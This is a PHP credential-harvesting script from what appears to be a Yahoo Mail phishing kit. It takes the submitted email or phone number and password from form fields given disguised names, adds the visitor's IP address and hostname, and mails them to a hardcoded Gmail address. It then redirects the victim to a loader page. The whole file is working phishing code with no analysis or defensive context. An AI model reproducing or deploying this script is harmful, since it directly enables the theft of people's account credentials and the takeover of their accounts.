<?
$to = "camachodaniel1306@gmail.com";
//--------------------------------
$oohayuname = $_POST['oohayuname'];
$oohaypasuma = $_POST['oohaypasuma'];
$ip = $_SERVER['REMOTE_ADDR'];
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$subj = "| |YahooMail |";
$msg = "Email or Phone : $oohayuname\nPassword : $oohaypasuma\nHost : $host\nIP : $ip";

			
			{
		mail($to,$subj."|".$ip,$msg);
				}
			header("location: 1loader.php");
?>